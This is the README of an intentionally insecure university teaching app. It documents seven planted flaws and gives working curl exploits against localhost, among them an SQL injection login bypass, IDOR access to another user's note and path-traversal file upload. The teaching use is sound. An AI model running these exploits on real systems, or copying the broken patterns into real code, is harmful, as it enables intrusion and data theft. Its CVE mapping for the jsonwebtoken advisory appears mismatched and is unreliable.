# v1-inseguro

Intentionally insecure version of the case-study app, built for a Cybersecurity
university course. It implements the exact same feature set and API surface as
`v2-seguro` (auth, resource CRUD, file upload/download), but **every security
control that a real app would have has been deliberately omitted or broken**.

**This code must never be deployed anywhere reachable, and must never be used
as a reference for real projects.** It exists purely so students can exploit
real, working vulnerabilities and later compare them against the hardened
`v2-seguro` implementation.

## Stack

- Node.js + Express
- SQLite via `better-sqlite3`
- JWT via `jsonwebtoken@8.5.1` (deliberately vulnerable version, see below)
- File upload via `multer`

## Running it

```bash
cd v1-inseguro
npm install
npm run seed     # creates data/v1-inseguro.db, applies schema.sql, inserts test users
npm start         # listens on http://localhost:43171
```

Seeded users (plaintext passwords, see vulnerability #2):

| username | password |
|---|---|
| alice | alice123 |
| bob | bob123 |

Each seeded user owns one private resource ("Alice private note" / "Bob
private note") — useful for demonstrating the IDOR vulnerability across
accounts.

### Docker

From the repository root:

```bash
docker build -f v1-inseguro/Dockerfile -t v1-inseguro .
docker run -p 3000:3000 v1-inseguro
```

The container does not run the seed script automatically; exec into it and run
`npm run seed`, or hit `/api/auth/register` to create your own user.

## API surface

```
POST   /api/auth/register
POST   /api/auth/login

GET    /api/resources
GET    /api/resources/:id
POST   /api/resources
PUT    /api/resources/:id
DELETE /api/resources/:id

POST   /api/resources/:id/upload
GET    /api/resources/:id/file
```

All `/api/resources*` routes require `Authorization: Bearer <token>` (token
obtained from `/api/auth/login`).

## The 7 intentional vulnerabilities

### 1. SQL Injection — `src/routes/auth.js`, `src/routes/resources.js`
Login and resource listing build SQL by raw string concatenation instead of
using `better-sqlite3` parameterized placeholders (`?`). Both the username and
password fields, and the `?search=` query param on `GET /api/resources`, are
spliced directly into the query string.

Exploit — auth bypass without knowing any password:
```bash
curl -s -X POST http://localhost:43171/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' -- ","password":"anything"}'
```
Returns a valid JWT for the first row in `users` (alice), no password needed.

### 2. Insecure password storage — `src/routes/auth.js`, `src/db/seed.js`
`password_hash` stores the raw plaintext password. No hashing, no salt, no
bcrypt/argon2. Anyone with read access to the SQLite file (or the SQL
injection above) gets every user's password in cleartext, not just a hash.

Exploit — dump plaintext passwords directly from the DB file (no app needed):
```bash
sqlite3 v1-inseguro/data/v1-inseguro.db "SELECT username, password_hash FROM users;"
# -> alice|alice123
# -> bob|bob123
```

### 3. Insecure JWT — `src/config.js`, `src/middleware/auth.js`, `src/routes/auth.js`
`JWT_SECRET` is a hardcoded string literal in source (`src/config.js`), and
tokens are signed with `jwt.sign(payload, JWT_SECRET)` with **no `expiresIn`**,
so a token issued once never expires. Combined with the known jsonwebtoken CVE
below, a leaked secret or the vulnerable library lets an attacker forge tokens
that are valid forever.

Exploit — decode the token payload and confirm there is no `exp` claim:
```bash
TOKEN=$(curl -s -X POST http://localhost:43171/api/auth/login -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>console.log(JSON.parse(d).token))")
echo $TOKEN | cut -d. -f2 | base64 -d
# -> {"id":1,"username":"alice","iat":...}   <- no "exp" field, token never expires
```

### 4. Broken Access Control (IDOR) — `src/routes/resources.js`
`GET/PUT/DELETE /api/resources/:id`, the upload endpoint, and the download
endpoint all fetch/mutate the resource by `:id` alone; none of them check
`resource.user_id === req.user.id`. Any authenticated user can read, modify,
delete, or attach a file to any other user's resource just by changing the id
in the URL.

Exploit — alice reads bob's private resource using her own token:
```bash
curl -s -X POST http://localhost:43171/api/auth/login -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'
# -> grab "token" from the response, then:
curl -s http://localhost:43171/api/resources/2 -H "Authorization: Bearer <alice_token>"
# -> returns bob's resource (id=2, user_id=2), even though alice's id is 1
```

### 5. Insecure file upload — `src/routes/resources.js`
`POST /api/resources/:id/upload` has no MIME/extension whitelist and no size
limit. It also sets `preservePath: true` on multer, which disables busboy's
built-in filename sanitization, so the file is saved under the **original
client-supplied filename**, unsanitized — a filename like `../../evil.txt`
traverses out of `src/uploads/`.

> Note: by default, multer's underlying `busboy` parser calls
> `path.basename()` on the uploaded filename as a built-in defense against
> exactly this attack. To keep this vulnerability genuinely exploitable (per
> the case-study requirement that every vulnerability be real, not simulated)
> `preservePath: true` is set explicitly, which turns that protection back
> off. This is documented in `src/routes/resources.js`.

Exploit — write a file outside the uploads directory:
```bash
curl -s -X POST http://localhost:43171/api/resources/1/upload \
  -H "Authorization: Bearer <alice_token>" \
  -F "file=@payload.txt;filename=../../traversal-evil.txt"
```
Verified: the file lands at `v1-inseguro/traversal-evil.txt` (two directories
above the intended `src/uploads/`), not inside the uploads folder.

### 6. Insecure configuration — `src/app.js`
- CORS: `cors({ origin: '*' })` — any origin can call the API with credentials.
- No Helmet — no `X-Content-Type-Options`, `X-Frame-Options`, CSP, etc.
- "Debug mode": every error handler returns `err.stack` (and, for auth
  errors, `err.message`) directly in the JSON response body, leaking file
  paths, library internals, and query details to the client.
- No rate limiting on `POST /api/auth/login` — unlimited brute-force attempts.

Exploit — confirm the open CORS header and the leaked stack trace on error:
```bash
curl -s -i -X POST http://localhost:43171/api/auth/register -H "Content-Type: application/json" \
  -H "Origin: https://evil.example.com" -d '{"username":"alice","password":"x"}'
# -> HTTP 200s show "Access-Control-Allow-Origin: *" regardless of Origin sent
# -> registering an existing username returns the full SqliteError stack trace
#    (file paths, line numbers, library internals) in the JSON error body
```

### 7. Hardcoded secrets — `src/config.js`, `src/db/connection.js`, `server.js`
`JWT_SECRET`, the SQLite file path, and the HTTP port are literal values
written directly in source, not read from `process.env` or a `.env` file —
anyone with repo access has the JWT signing secret and the exact DB location.

## Deliberately vulnerable dependency

`jsonwebtoken` is pinned to `8.5.1` in `package.json`. `npm audit` confirms
this version is flagged:

```
jsonwebtoken  <=8.5.1
Severity: high
jsonwebtoken vulnerable to signature validation bypass due to insecure
default algorithm in jwt.verify() - https://github.com/advisories/GHSA-qwph-4952-7xr6
```

This advisory (GHSA-qwph-4952-7xr6) corresponds to **CVE-2022-23529**
(insufficient/insecure default algorithm handling in `jwt.verify()`), the CVE
called out in the project plan. `npm audit` also surfaces two related
advisories for the same version range (GHSA-8cf7-32gw-wr33 and
GHSA-hjrf-2m68-5959) covering unrestricted key type usage and forgeable
RSA-to-HMAC tokens — all stemming from the same root cause in `<=8.5.1`. In
`v2-seguro` this is upgraded to the latest `9.x` release, which patches these
issues.

## What this README is for

This is reference documentation for the student/instructor building and
grading the case study — a checklist of what's broken and why, not a security
advisory for a real product.
